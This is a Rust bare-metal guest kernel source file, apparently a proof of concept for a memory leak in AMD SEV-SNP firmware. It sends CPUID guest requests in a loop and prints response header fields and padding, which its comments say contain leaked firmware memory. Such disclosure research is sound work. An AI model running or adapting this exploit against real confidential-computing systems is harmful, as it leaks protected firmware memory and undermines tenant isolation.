#![no_std]
#![no_main]
#![feature(
    asm_const,
    core_intrinsics,
    layout_for_ptr,
    lazy_cell,
    naked_functions,
    sync_unsafe_cell
)]

use core::ops::Deref;

use bytemuck::pod_read_unaligned;
use log::{debug, LevelFilter};
use snp_types::Reserved;

use crate::{
    ghcb::{build_request_message, do_guest_request, extract_response, CpuidFunction, MsgCpuid},
    logging::SerialLogger,
};

mod ghcb;
mod logging;
mod pagetable;
mod panic;
mod reset_vector;

fn main() -> ! {
    log::set_logger(&SerialLogger).unwrap();
    log::set_max_level(LevelFilter::Trace);

    // Prepare a MSG_CPUID_REQ structure.
    let request = MsgCpuid {
        count: 0,
        _reserved1: Reserved::ZERO,
        _reserved2: Reserved::ZERO,
        functions: [CpuidFunction {
            eax_in: 0,
            ecx_in: 0,
            xcr0_in: 0,
            xss_in: 0,
            eax: 0,
            ebx: 0,
            ecx: 0,
            edx: 0,
            _reserved: Reserved::ZERO,
        }; 64],
        padding: Reserved::ZERO,
    };

    // This is the main loop that prints leaked values.

    loop {
        // Encrypt the payload and assemble the guest message.
        let (msg_seqno, request_message) = build_request_message(request);

        // Execute the guest request.
        let mut response_message = do_guest_request(request_message);

        // Print the reserved fields in the response header
        // -> Some of the reserved fields here contain leaked memory from the
        //    firmware.
        debug!("{response_message:02x?}");

        // Extract and decrypt the payload.
        let (_msg_ty, _msg_version, data) = extract_response(msg_seqno + 1, &mut response_message);

        // Reinterpret the bytes as a response.
        let msg_cpuid: MsgCpuid = pod_read_unaligned(data);

        // Print the padding in the message.
        // -> This will contain leaked memory from the firmware.
        debug!("{:02x?}", msg_cpuid.padding);
    }
}

/// The kernel runs singlethreaded, so we don't need statics to be `Sync`.
/// This type can wrap another type and make it `Sync`.
/// If we ever decide to run the kernel with more than one thread, this
/// type needs to be removed in favor of either a mutex or a thread-local.
/// Note that we also don't have any exception handlers that could be
/// considered a second thread.
pub struct FakeSync<T>(T);

impl<T> FakeSync<T> {
    pub const fn new(value: T) -> Self {
        Self(value)
    }
}

impl<T> Deref for FakeSync<T> {
    type Target = T;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

unsafe impl<T> Sync for FakeSync<T> {}
